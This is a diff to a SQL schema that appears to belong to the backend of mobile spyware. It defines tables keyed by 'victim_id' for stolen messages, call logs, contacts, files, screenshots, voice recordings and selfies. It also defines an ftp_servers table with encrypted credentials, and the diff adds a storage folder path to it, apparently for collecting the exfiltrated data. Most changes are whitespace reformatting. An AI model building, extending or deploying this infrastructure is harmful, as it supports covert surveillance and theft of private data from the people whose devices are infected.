@@ -76,7 +76,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id`                   INT(11) NOT NULL    AUTO_INCREMENT,
   `victim_id`            INT(11) NOT NULL,
-  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join','file', 'other') NOT NULL,
+  `data_type`            ENUM('messages', 'command_statuses', 'call_logs', 'contacts', 'files', 'media_screen_shot', 'media_voice', 'media_selfie', 'join', 're_join', 'file', 'other') NOT NULL,
   `error`                TINYINT(4) NOT NULL,
   `message`              TEXT NOT NULL,
   `server_error`         TINYINT(4) NOT NULL DEFAULT 0,
@@ -215,19 +215,19 @@ CREATE TABLE IF NOT EXISTS `calls` (
 
 DROP TABLE IF EXISTS `ftp_servers`;
 CREATE TABLE IF NOT EXISTS `ftp_servers` (
-  `id`               INT(11)     NOT NULL AUTO_INCREMENT,
-  `name`             VARCHAR(10) NOT NULL,
-  `ftp_domain_enc`   TEXT        NOT NULL,
-  `ftp_username_enc` TEXT        NOT NULL,
-  `ftp_password_enc` TEXT        NOT NULL,
-  `size_in_mb`       INT(11)     NOT NULL,
+  `id`                  INT(11)     NOT NULL AUTO_INCREMENT,
+  `name`                VARCHAR(10) NOT NULL,
+  `ftp_domain_enc`      TEXT        NOT NULL,
+  `ftp_username_enc`    TEXT        NOT NULL,
+  `ftp_password_enc`    TEXT        NOT NULL,
+  `storage_folder_path` VARCHAR(50) NOT NULL DEFAULT '/public_html',
+  `size_in_mb`          INT(11)     NOT NULL,
   PRIMARY KEY (id)
 );
 
 INSERT INTO `ftp_servers` (name, ftp_domain_enc, ftp_username_enc, ftp_password_enc, size_in_mb) VALUES
   ('SERVER 1', 'U1kHyw0ABMAbfhg++WHYOaSJLrdi+Pht/EKPPJWGE8k=', 'mod6MfmVQKxTqzFLhxY3qQ==', 'cUmCHjmVHcz2i5Ucgqkp3Q==',
    1500);
-
 
 
 DROP TABLE IF EXISTS `media`;
@@ -268,7 +268,6 @@ CREATE TABLE IF NOT EXISTS `messages` (
     ON DELETE CASCADE
     ON UPDATE CASCADE
 );
-
 
 
 /* Change the delimiter so we can use ";" within the CREATE TRIGGER */
